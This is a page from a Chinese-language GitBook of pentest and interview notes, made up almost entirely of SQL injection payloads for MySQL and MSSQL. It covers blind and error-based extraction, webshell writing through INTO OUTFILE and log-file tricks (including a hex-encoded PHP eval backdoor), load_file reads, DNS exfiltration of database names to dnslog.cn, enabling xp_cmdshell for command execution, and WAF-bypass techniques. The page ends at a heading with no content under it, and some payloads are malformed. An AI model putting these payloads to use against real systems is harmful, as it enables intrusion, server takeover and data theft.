
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>sql注入 · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="xss.html" />
    
    
    <link rel="prev" href="../language/algorithm.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    前言
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../tips.html">
            
                <a href="../tips.html">
            
                    
                    tips
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../language/python.html">
            
                <a href="../language/python.html">
            
                    
                    python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../interview/python.html">
            
                <a href="../interview/python.html">
            
                    
                    python后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../language/python_secure.html">
            
                <a href="../language/python_secure.html">
            
                    
                    python安全
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../interview/python_secure.html">
            
                <a href="../interview/python_secure.html">
            
                    
                    python安全面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../language/java.html">
            
                <a href="../language/java.html">
            
                    
                    java
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="../language/javagui.html">
            
                <a href="../language/javagui.html">
            
                    
                    java swing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.2" data-path="../language/javafx.html">
            
                <a href="../language/javafx.html">
            
                    
                    javafx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.3" data-path="../interview/java.html">
            
                <a href="../interview/java.html">
            
                    
                    JAVA后端开发面试题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.4" data-path="../language/s2.html">
            
                <a href="../language/s2.html">
            
                    
                    s2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4" data-path="../language/golang.html">
            
                <a href="../language/golang.html">
            
                    
                    golang
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1" data-path="../interview/golang.html">
            
                <a href="../interview/golang.html">
            
                    
                    golang后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.5" data-path="../thinkphp/thinkphp6.html">
            
                <a href="../thinkphp/thinkphp6.html">
            
                    
                    thinkphp
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.5.1" data-path="../thinkphp/thinkphp面试题.html">
            
                <a href="../thinkphp/thinkphp面试题.html">
            
                    
                    thinkphp框架面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.6" data-path="../thinkphp/yii2.html">
            
                <a href="../thinkphp/yii2.html">
            
                    
                    yii2
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.7" data-path="../c#/c">
            
                <span>
            
                    
                    c#
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.7.1" data-path="../.net/.net面试题.html">
            
                <a href="../.net/.net面试题.html">
            
                    
                    .NET面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.8" data-path="../language/c++.html">
            
                <a href="../language/c++.html">
            
                    
                    c++
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.8.1" data-path="../language/c++面试题.html">
            
                <a href="../language/c++面试题.html">
            
                    
                    c++面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.9" data-path="../android/base.html">
            
                <a href="../android/base.html">
            
                    
                    安卓开发
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../language/algorithm.html">
            
                <a href="../language/algorithm.html">
            
                    
                    算法基础
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter active" data-level="4.1" data-path="sql injection.html">
            
                <a href="sql injection.html">
            
                    
                    sql注入
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="xss.html">
            
                <a href="xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="xxe.html">
            
                <a href="xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../neiwang/privilege.html">
            
                <a href="../neiwang/privilege.html">
            
                    
                    权限提升
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2" data-path="../neiwang/information.html">
            
                <a href="../neiwang/information.html">
            
                    
                    横向移动，代理隧道
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.3" >
            
                <span>
            
                    
                    [权限维持]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.3.1" data-path="../thinkphp/pentest.html">
            
                <a href="../thinkphp/pentest.html">
            
                    
                    渗透面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../reverse/pe.html">
            
                <a href="../reverse/pe.html">
            
                    
                    PE文件结构
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../base/huibian2.html">
            
                <a href="../base/huibian2.html">
            
                    
                    汇编
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3" data-path="../reverse/win32.html">
            
                <a href="../reverse/win32.html">
            
                    
                    win32
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.4" data-path="../reverse/mfc.html">
            
                <a href="../reverse/mfc.html">
            
                    
                    MFC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5" data-path="../reverse/保护模式.html">
            
                <a href="../reverse/保护模式.html">
            
                    
                    保护模式
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.5.1" >
            
                <span>
            
                    
                    逆向基础面试题
            
                </span>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="../neiwang/antikill.html">
            
                <a href="../neiwang/antikill.html">
            
                    
                    免杀
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="../neiwang/antikillinter.html">
            
                <a href="../neiwang/antikillinter.html">
            
                    
                    反病毒/免杀面试题
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >sql注入</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <p><a href="http://sqlwiki.batmanfuture.cn/" target="_blank">&#x535A;&#x5BA2;</a></p>
<p><a href="https://www.jianshu.com/p/bc35f8dd4f7c" target="_blank">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
<p><a href="https://www.jianshu.com/p/fcae21926e5c" target="_blank">https://www.jianshu.com/p/fcae21926e5c</a></p>
<p>&#x51FD;&#x6570;&#x624B;&#x518C;</p>
<p>mssql:<a href="https://cankaoshouce.com/sql/sqlserver-function.html" target="_blank">https://cankaoshouce.com/sql/sqlserver-function.html</a></p>
<p>mysql:<a href="https://www.sjkjc.com/mysql-ref/ascii/" target="_blank">https://www.sjkjc.com/mysql-ref/ascii/</a></p>
<h6 id="gtidsubset">GTID_SUBSET</h6>
<pre><code class="lang-http">&#x5B57;&#x7B26;&#x4E32;
    &#x5B57;&#x7B26;&#x578B;&#xFF1A;1) and GTID_SUBSET(concat(char(126),(database())),5201)-- test
    &#x6570;&#x5B57;&#x578B;&#xFF1A;1 and GTID_SUBSET(concat(char(126),(database())),5201)-- test
</code></pre>
<p><img src="https://s3.bmp.ovh/imgs/2022/10/23/5b4a240b49b69280.png" alt=""></p>
<pre><code class="lang-http">&#x5728;SQL&#x8BED;&#x53E5;&#x4E2D;&#x6709;asc&#x548C;desc&#x7684;&#x51FA;&#x73B0;&#xFF0C;&#x4ED6;&#x4EEC;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x5BF9;&#x67D0;&#x4E2A;&#x6807;&#x7B7E;&#x6309;&#x7167;&#x4ECE;&#x5C0F;&#x5230;&#x5927;&#x6216;&#x8005;&#x4ECE;&#x5927;&#x5230;&#x5C0F;&#x6392;&#x5E8F;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x8BF7;&#x6C42;&#x5305;&#x4E2D;&#x53D1;&#x73B0;&#x4E86;asc&#x548C;desc&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x5728;&#x540E;&#x9762;&#x589E;&#x52A0;&#x5185;&#x5BB9;&#x5224;&#x65AD;SQL&#x6CE8;&#x5165;
&#x5728;mysql&#x5F53;&#x4E2D;&#xFF0C;&#x5982;&#x679C;select 1/0&#xFF0C;&#x867D;&#x7136;&#x4F1A;&#x8B66;&#x544A;&#xFF0C;&#x4F46;&#x4F9D;&#x65E7;&#x4F1A;&#x8FD4;&#x56DE;&#x6B63;&#x5E38;&#x5185;&#x5BB9;&#xFF0C;&#x4F46;&#x662F;&#x5728;oracle&#x4E2D;&#xFF0C;1/0&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x5E76;&#x4E0D;&#x80FD;&#x8FD4;&#x56DE;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x4E00;&#x4E2A;&#x53D8;&#x79CD;&#x7684;&#x62A5;&#x9519;&#x5224;&#x65AD;

&#x6392;&#x5E8F;&#x6CE8;&#x5165;
SELECT * FROM ty_user ORDER BY id-(updatexml(1,concat(0x7e,user()),0));
desc = -(updatexml(1,concat(0x7e,user()),0))


select * from ty_user where id= &apos;1&apos; LIMIT 0,1 INTO OUTFILE &apos;D:\\phpStudy\\phpstudy_pro\\WWW\\123456aaaa.php&apos; LINES TERMINATED BY &quot;&lt;?php phpinfo();?&gt;&quot;;

SELECT * FROM ty_user ORDER BY if(substr(database(),1,1)=&apos;w&apos;,id,exp(710));
</code></pre>
<pre><code class="lang-http">mysql:
    &apos;||if(substr(database(),1,1)=&apos;x&apos;,1,exp(710))||&apos;
    &quot;||if(substr(database(),1,1)=&apos;x&apos;,1,exp(710))||&quot;
    &#x4E5F;&#x5C31;&#x662F;user()&#x7684;&#x7B2C;1&#x4F4D;&#x5982;&#x679C;&#x662F;x&#x90A3;&#x4E48;&#x6B63;&#x5E38;&#xFF0C;&#x53CD;&#x4E4B;&#x62A5;&#x9519;

1&apos;if(ascii(substring(db_name(),1,1)))&gt;50%20WAITFOR%20DELAY%20&apos;0:0:5&apos;--%20
</code></pre>
<pre><code class="lang-http">&#x6570;&#x5B57;&#x578B;&#x5E03;&#x5C14;&#x76F2;&#x6CE8;&#xFF1A;
||ascii(if(substring(db_name(),1,1)))=10,1,0)||
1/if(ascii(substr(database(),1,1))=116,1,exp(710))

userName=1&apos;if(ascii(substring(db_name(),1,1)))&gt;50%20WAITFOR%20DELAY%20&apos;0:0:5&apos;--%20
</code></pre>
<pre><code class="lang-http">select * from ty_user where id=1-if(ascii(left(database(),1))=118,1,exp(710))
</code></pre>
<h4 id="mysql-getshell">MYSQL-getshell</h4>
<h5 id="1&#xFF09;&#x5168;&#x5C40;&#x65E5;&#x5FD7;&#x5199;&#x5165;">1&#xFF09;&#x5168;&#x5C40;&#x65E5;&#x5FD7;&#x5199;&#x5165;</h5>
<pre><code>//&#x662F;&#x5426;&#x5F00;&#x542F;&#x5168;&#x5C40;&#x65E5;&#x5FD7;&#xFF0C;&#x8BBE;&#x7F6E;&#x5F00;&#x542F;&#x5E76;&#x786E;&#x5B9A;&#x5199;&#x5165;&#x8DEF;&#x5F84;
show variables like &apos;%general%&apos;;
set global general_log=on;
set global general_log_file = &apos;D:/phpStudy/phpstudy_pro/WWW/log.php&apos;;

//&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x65B9;&#x5F0F;&#x8BBE;&#x7F6E;&#x6210;file
show variables like &apos;log_output&apos;;
set global log_output=&apos;file&apos;;

//&#x65B0;&#x5EFA;&#x67E5;&#x8BE2;&#xFF0C;&#x7136;&#x540E;&#x5199;&#x5165;webshell
select &apos;&lt;?php phpinfo();?&gt;&apos;;
</code></pre><p><a href="https://imgse.com/i/ppg71JI" target="_blank"><img src="https://s1.ax1x.com/2023/03/30/ppg71JI.png" alt="ppg71JI.png"></a><a href="https://imgse.com/i/ppg73Wt" target="_blank"><img src="https://s1.ax1x.com/2023/03/30/ppg73Wt.png" alt="ppg73Wt.png"></a></p>
<h5 id="2&#xFF09;into-outfile--into-dumpfile">2&#xFF09;into outfile / into dumpfile</h5>
<pre><code>//&#x67E5;&#x770B;secure-file-priv&#x53C2;&#x6570;&#x7684;&#x503C;&#xFF0C;5.6&#x4EE5;&#x4E0B;&#x9ED8;&#x8BA4;&#x662F;&#x7A7A;&#xFF0C;&#x4EE5;&#x4E0A;&#x662F;null
show global variables like &apos;%secure%&apos;;
//&#x53EF;&#x4EE5;&#x5728;webshell&#x4E0B;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;mysql.ini&#x7684;&#x503C;
</code></pre><p><a href="https://imgse.com/i/ppg7sS0" target="_blank"><img src="https://s1.ax1x.com/2023/03/30/ppg7sS0.png" alt="ppg7sS0.png"></a></p>
<pre><code>//&#x9ED1;&#x76D2;
?id=1 union select 1,&quot;&lt;?php phpinfo();?&gt;&quot;,3 into outfile &apos;E:/study/WWW/evil.php&apos;

?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;E:/study/WWW/evil.php&quot;

?id=1 INTO OUTFILE &apos;&#x7269;&#x7406;&#x8DEF;&#x5F84;&apos; lines terminated by  &#xFF08;&#x4E00;&#x53E5;&#x8BDD;hex&#x7F16;&#x7801;&#xFF09;#
?id=1 INTO OUTFILE &apos;&#x7269;&#x7406;&#x8DEF;&#x5F84;&apos; fields terminated by &#xFF08;&#x4E00;&#x53E5;&#x8BDD;hex&#x7F16;&#x7801;&#xFF09;#
?id=1 INTO OUTFILE &apos;&#x7269;&#x7406;&#x8DEF;&#x5F84;&apos; columns terminated by &#xFF08;&#x4E00;&#x53E5;&#x8BDD;hex&#x7F16;&#x7801;&#xFF09;#
?id=1 INTO OUTFILE &apos;&#x7269;&#x7406;&#x8DEF;&#x5F84;&apos; lines starting by    &#xFF08;&#x4E00;&#x53E5;&#x8BDD;hex&#x7F16;&#x7801;&#xFF09;#



//&#x767D;&#x76D2;
select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &apos;D:/phpStudy/phpstudy_pro/WWW/evil.php&apos;;

C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/
</code></pre><h5 id="3&#xFF09;&#x8BFB;&#x6587;&#x4EF6;">3&#xFF09;&#x8BFB;&#x6587;&#x4EF6;</h5>
<pre><code>//&#x9ED1;&#x76D2;
http://test.com/sqli/Less-1/?id=-1&apos; union select 1,load_file(&apos;c:\\flag.txt&apos;),3 --+
http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.l4sq34.dnslog.cn\\abc&apos;))--+
//&#x767D;&#x76D2;
select load_file(&apos;D:/phpStudy/phpstudy_pro/WWW/test.php&apos;);
select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.c21hol.dnslog.cn\\abc&apos;));
</code></pre><h5 id="4&#xFF09;&#x5BFC;&#x51FA;">4&#xFF09;&#x5BFC;&#x51FA;</h5>
<pre><code>use mysql;
CREATE TABLE test( id text(500) not null);
INSERT INTO test (id) VALUES(&apos;&lt;?php phpinfo();?&gt;&apos;);
SELECT id FROM test INTO OUTFILE &apos;D:/phpStudy/phpstudy_pro/WWW/batman.php&apos;;
</code></pre><h5 id="5&#xFF09;&#x6162;&#x65E5;&#x5FD7;&#x5199;&#x5165;">5&#xFF09;&#x6162;&#x65E5;&#x5FD7;&#x5199;&#x5165;</h5>
<pre><code>show variables like &apos;%slow_query_log%&apos;;
set global slow_query_log=1;
set global slow_query_log_file=&apos;D:/phpStudy/phpstudy_pro/WWW/batman123.php&apos;;
show global variables like &apos;%long_query_time%&apos;;
select &apos;&lt;?php phpinfo();?&gt;&apos; or sleep(11);
</code></pre><pre><code>1&apos;%20LIMIT%200,1%20load_file(&apos;C:/ProgramData/360/log/test.txt&apos;);
</code></pre><pre><code>//&#x62A5;&#x9519;
1&apos; and 1=(db_name())--+
//&#x5E03;&#x5C14;
and len(db_name())&gt;5
and ascii (substring(db_name(),1,1))&gt;95

1&apos;and ascii (substring(db_name(),1,1))&gt;95 --%20

1&apos; and substring(db_name(2),1,1)=&apos;n&apos;--+
</code></pre><pre><code class="lang-c#">// &#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;dba&#x6743;&#x9650;
select is_srvrolemember(&apos;sysadmin&apos;)

//&#x547D;&#x4EE4;&#x6267;&#x884C;
execute (&apos;sp_configure &quot;show advanced options&quot;,1&apos;);
execute (&apos;reconfigure&apos;);
execute (&apos;sp_configure &quot;xp_cmdshell&quot;, 1&apos;);
execute (&apos;reconfigure&apos;);
execute (&apos;sp_configure&apos;);
execute (&apos;xp_cmdshell &quot;net user&quot;&apos;); 
// &#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x7AD9;&#x5E93;&#x5206;&#x79BB;
select host_name(); //&#x4E3B;&#x673A;&#x540D;
select @@servername; //&#x670D;&#x52A1;&#x5668;&#x540D;
</code></pre>
<h4 id="sql&#x6CE8;&#x5165;&#x62FF;shell">SQL&#x6CE8;&#x5165;&#x62FF;shell</h4>
<p>&#x901A;&#x8FC7;SQL&#x6CE8;&#x5165;&#x62FF;shell&#x4E00;&#x822C;&#x5C31;&#x662F;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#xFF1A;</p>
<pre><code>select host_name();//&#x4E3B;&#x673A;&#x540D;
select @@servername;//&#x670D;&#x52A1;&#x5668;&#x540D;
//&#x5982;&#x679C;&#x76F8;&#x540C;&#x5219;&#x4EE3;&#x8868;&#x6570;&#x636E;&#x5E93;&#x548C;web&#x5728;&#x540C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x9762;
</code></pre><h6 id="1&#x5229;&#x7528;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x51FD;&#x6570;">1.&#x5229;&#x7528;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x51FD;&#x6570;</h6>
<pre><code class="lang-http">mysql&#xFF1A;sys_exec&#xFF0C;sys_eval        &#x4E5F;&#x662F;&#x5728;&#x5229;&#x7528;mysql&#x63D0;&#x6743;&#x65F6;&#x5229;&#x7528;&#x5230;&#x7684;&#x51FD;&#x6570;
mssql&#xFF1A;xp_cmdshell(&#x5229;&#x7528;sp_oacreate&#x51FD;&#x6570;&#x5F00;&#x542F;)

execute (&apos;sp_configure &quot;show advanced options&quot;,1&apos;);
execute (&apos;reconfigure&apos;);
execute (&apos;sp_configure &quot;xp_cmdshell&quot;, 1&apos;);
execute (&apos;reconfigure&apos;);
execute (&apos;sp_configure&apos;);
execute (&apos;xp_cmdshell &quot;net user&quot;&apos;);
</code></pre>
<p><a href="https://imgse.com/i/pSL17b4" target="_blank"><img src="https://s1.ax1x.com/2023/02/18/pSL17b4.png" alt="pSL17b4.png"></a></p>
<h6 id="&#x5176;&#x4ED6;&#xFF1A;loadfile&#x8BFB;&#x6587;&#x4EF6;">&#x5176;&#x4ED6;&#xFF1A;load_file&#x8BFB;&#x6587;&#x4EF6;</h6>
<p>load_file()&#x8BFB;&#x6587;&#x4EF6;</p>
<p><a href="http://test.com/sqli/Less-1/?id=-1" target="_blank">http://test.com/sqli/Less-1/?id=-1</a>&apos; union select 1,load_file(&apos;c:\flag.txt&apos;),3 --+</p>
<h6 id="&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;">&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;</h6>
<p>&#x6BD4;&#x5982;&#x5728;mysql&#x4E2D;&#xFF0C;waf&#x5C06;sleep()&#x51FD;&#x6570;&#x5217;&#x5165;&#x4E86;&#x9ED1;&#x540D;&#x5355;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5177;&#x5907;&#x76F8;&#x540C;&#x529F;&#x80FD;&#x7684;benchmark()&#x51FD;&#x6570;&#x6765;&#x5B9E;&#x73B0;&#x7ED5;&#x8FC7;</p>
<pre><code>&lt; &gt; &#x7B49;&#x4EF7;&#x4E8E; BETWEEN
= &#x7B49;&#x4EF7;&#x4E8E; like
Hex() bin() &#x7B49;&#x4EF7;&#x4E8E;ascii()
Sleep() &#x7B49;&#x4EF7;&#x4E8E; benchmark()
Mid()substring() &#x7B49;&#x4EF7;&#x4E8E; substr(&#xFF09;
@@user &#x7B49;&#x4EF7;&#x4E8E; User()
@@Version &#x7B49;&#x4EF7;&#x4E8E; version()
(mysql&#x652F;&#x6301;&amp;&amp; || ,oracle&#x4E0D;&#x652F;&#x6301; &amp;&amp; ||&#xFF09;
</code></pre><h6 id="2&#x7279;&#x6B8A;&#x7B26;&#x53F7;">2.&#x7279;&#x6B8A;&#x7B26;&#x53F7;</h6>
<p>&#x539F;&#x7406;&#xFF1A;&#x7ED3;&#x5408;&#x4E0D;&#x540C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7279;&#x6027;&#x6765;&#x5B9E;&#x73B0;&#x7ED5;&#x8FC7;&#x3002;(&#x6700;&#x597D;&#x662F;&#x53EF;&#x4EE5;&#x627E;&#x5230;waf&#x5F00;&#x53D1;&#x8005;&#x90FD;&#x4E0D;&#x4E86;&#x89E3;&#x7684;&#x67D0;&#x4E9B;&#x7279;&#x6027;),&#x4EE5;&#x4E0B;&#x662F;&#x4E24;&#x4E2A;&#x5E7F;&#x4E3A;&#x6D41;&#x4F20;&#x7684;&#x5C0F;&#x7279;&#x6027;</p>
<pre><code>&#x6BD4;&#x5982; &quot;+&quot; select+password+from+mysql.user &#x76F8;&#x5F53;&#x4E8E;&#x662F;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#x7684;&#x4F5C;&#x7528;

&quot;&apos;&quot;&#x653E;&#x5728;mysql&#x7684;&#x672B;&#x5C3E;&#x4F1A;&#x8D77;&#x5230;&#x6CE8;&#x91CA;&#x7B26;&#x7684;&#x4F5C;&#x7528;
</code></pre><h6 id="3&#x7F16;&#x7801;">3.&#x7F16;&#x7801;</h6>
<p>&#x53EF;&#x4EE5;&#x7ED3;&#x5408;&#x5404;&#x79CD;&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#x6765;&#x7ED5;&#x8FC7;,&#x6BD4;&#x5982;url&#x7F16;&#x7801;&#xFF0C;url&#x53CC;&#x91CD;&#x7F16;&#x7801;,&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7F16;&#x7801;&#xFF0C;unicode&#x7F16;&#x7801;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7F16;&#x7801;&#x7B49;&#x3002;</p>
<p>&#x4E3E;&#x4E2A;&#x6817;&#x5B50;&#xFF1A;mysql&#x9ED8;&#x8BA4;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x662F;latin,&#x56E0;&#x6B64;&#x5728;php&#x4EE3;&#x7801;&#x91CC;&#x9762;&#x8BBE;&#x7F6E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x4E3A; utf-8,&#x8FD9;&#x53EA;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x56E0;&#x6B64;&#x5B58;&#x5728;&#x5B57;&#x7B26;&#x96C6;&#x88C5;&#x6362;&#x7684;&#x95EE;&#x9898;utf-8&#x2014;&gt;latin,&#x82E5;&#x4F20;&#x8FDB;&#x6765;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x4E0D;&#x662F;&#x5B8C;&#x6574;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x5219;&#x4F1A;&#x5BFC;&#x81F4;&#x4E0D;&#x5B8C;&#x6574;&#x7684;&#x5B57;&#x7B26;&#x81EA;&#x52A8;&#x4F1A;&#x5FFD;&#x7565;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6BD4;&#x5982;username=admin%c2 , &#x7531;&#x4E8E;%c2&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;utf-8&#x5B57;&#x7B26; &#x56E0;&#x6B64;&#x4F20;&#x5230;Mysql &#x91CC;&#x9762; &#x81EA;&#x52A8;&#x5FFD;&#x7565;&#x4E86;&#xFF0C;&#x5BFC;&#x81F4;&#x67E5;&#x51FA;&#x7684;&#x662F;admin&#x7528;&#x6237;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x7ED5;&#x8FC7;</p>
<h6 id="4&#x6CE8;&#x91CA;&#x7B26;">4.&#x6CE8;&#x91CA;&#x7B26;</h6>
<p>/<em>xxx</em>/&#x662F;&#x6CE8;&#x91CA;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5145;&#x5F53;&#x7A7A;&#x767D;&#x7B26;&#x3002;&#x56E0;&#x4E3A; /<strong>/&#x53EF;&#x4F7F;&#x5F97;MySQL&#x5BF9;sql&#x8BED;&#x53E5;(union/</strong>/select)&#x8BCD;&#x6CD5;&#x89E3;&#x6790;&#x6210;&#x529F;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#x8BB8;&#x591A;WAF&#x90FD;&#x8003;&#x8651;&#x5230;/<strong>/&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x7A7A;&#x767D;&#x5206;&#xFF0C;&#x4F46;&#x662F;waf&#x68C0;&#x6D4B; &#x201C;/*.</strong>/&#x201D;&#x5F88;&#x6D88;&#x8017;&#x6027;&#x80FD;&#xFF0C;&#x5DE5;&#x7A0B;&#x5E08;&#x4F1A;&#x6298;&#x4E2D;&#xFF0C;&#x53EF;&#x80FD;&#x5728;&#x68C0;&#x6D4B;&#x4E2D;&#x95F4;&#x5F15;&#x5165;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;/<em>w+</em>/&#x3002;&#x6216;&#x8005;&#xFF0C;WAF&#x53EF;&#x80FD;&#x53EA;&#x4E2D;&#x95F4;&#x68C0;&#x67E5;n&#x4E2A;&#x5B57;&#x7B26;&#x201C;/<em>.{,n}</em>/&#x201D;&#x3002;&#x6839;&#x636E;&#x4EE5;&#x4E0A;&#x60F3;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x9010;&#x6B65;&#x6D4B;&#x8BD5;&#x7ED5;&#x8FC7;&#x65B9;&#x6CD5;&#xFF1A;</p>
<p>&#x5148;&#x6D4B;&#x8BD5;&#x6700;&#x57FA;&#x672C;&#x7684;&#xFF1A;union/<em>*/select&#x518D;&#x6D4B;&#x8BD5;&#x4E2D;&#x95F4;&#x5F15;&#x5165;&#x7279;&#x6B8A;&#x5B57;&#xFF1A;union/</em>aaaa%01bbs*/select&#x6700;&#x540E;&#x6D4B;&#x8BD5;&#x6CE8;&#x91CA;&#x957F;&#x5EA6;&#xFF1A;</p>
<pre><code>union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select
</code></pre><h6 id="5&#x7A7A;&#x767D;&#x7B26;&#x7ED5;&#x8FC7;">5.&#x7A7A;&#x767D;&#x7B26;&#x7ED5;&#x8FC7;</h6>
